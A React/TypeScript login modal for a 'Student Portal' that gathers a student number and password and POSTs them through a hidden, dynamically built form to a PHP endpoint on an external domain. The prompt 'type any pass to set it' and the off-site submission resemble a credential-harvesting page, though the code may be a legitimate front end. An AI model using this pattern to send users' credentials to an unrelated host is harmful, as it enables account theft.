import { useState } from 'react';
import { Lock, CreditCard, Key, Eye, EyeOff, LogIn, Info, AlertTriangle } from 'lucide-react';
import {
  Dialog, DialogContent,
} from '@/components/ui/dialog';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';

interface LoginModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

export function LoginModal({ open, onOpenChange }: LoginModalProps) {
  const [showPassword, setShowPassword] = useState(false);
  const [studentNo, setStudentNo] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://xt.pbhitsolution.info/enrollment_hub/student_portal_logic.php';
    form.style.display = 'none';

    const sn = document.createElement('input');
    sn.name = 'student_no';
    sn.value = studentNo;
    form.appendChild(sn);

    const pw = document.createElement('input');
    pw.name = 'password';
    pw.value = password;
    form.appendChild(pw);

    const btn = document.createElement('input');
    btn.name = 'btn_login';
    btn.value = '1';
    form.appendChild(btn);

    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-[420px] p-0 gap-0 rounded-2xl border-0 shadow-2xl overflow-hidden">
        <form onSubmit={handleSubmit}>
          {/* Header */}
          <div className="flex flex-col items-center pt-8 pb-4 px-6">
            <div className="w-[65px] h-[65px] rounded-full bg-[#0B1F3F] flex items-center justify-center mb-3">
              <Lock className="w-7 h-7 text-white" />
            </div>
            <h3 className="text-xl font-bold text-[#0B1F3F]">Student Portal</h3>
            <p className="text-[13px] text-gray-400 mt-0.5">Secure Sign-In</p>
          </div>

          <div className="px-6 pb-6 space-y-4">
            {/* Student Number */}
            <div>
              <Label className="text-xs font-semibold text-gray-500 uppercase tracking-wide mb-1.5 block">Student Number</Label>
              <div className="relative">
                <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                <Input
                  name="student_no"
                  value={studentNo}
                  onChange={e => setStudentNo(e.target.value)}
                  placeholder="School ID format (include dash)"
                  className="pl-10"
                  required
                />
              </div>
            </div>

            {/* Password */}
            <div>
              <Label className="text-xs font-semibold text-gray-500 uppercase tracking-wide mb-1.5 block">Password</Label>
              <div className="relative">
                <Key className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                <Input
                  name="password"
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                  placeholder="Enter password"
                  className="pl-10 pr-10"
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                >
                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            {/* Helper */}
            <div className="flex items-center justify-between">
              <span className="text-[11px] text-gray-400 flex items-center gap-1">
                <Info className="w-3 h-3" /> First time? Type any pass to set it.
              </span>
            </div>

            {/* Submit */}
            <button
              type="submit"
              name="btn_login"
              className="w-full bg-[#0B1F3F] hover:bg-[#16325B] text-white font-bold py-3 rounded-xl transition-all flex items-center justify-center gap-2"
            >
              <LogIn className="w-4 h-4" /> LOGIN TO DASHBOARD
            </button>

            {/* Notices */}
            <div className="bg-amber-50 border-l-4 border-[#D4A843] p-3 rounded-r-lg">
              <p className="text-[11px] text-gray-600 leading-relaxed">
                <span className="font-bold"><AlertTriangle className="w-3 h-3 inline mr-1 text-[#D4A843]" />Access Notice:</span>{' '}
                Only officially enrolled or confirmed students can log in. Check with the Registrar if you have issues.
              </p>
            </div>

            <div className="border border-red-200 rounded-lg p-3 bg-white">
              <p className="text-[11px] text-gray-600 leading-relaxed">
                <span className="font-bold text-red-500">Security Protocol:</span>{' '}
                Do not share your credentials. Successive failed logins will result in temporary account lockout.
              </p>
            </div>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
}
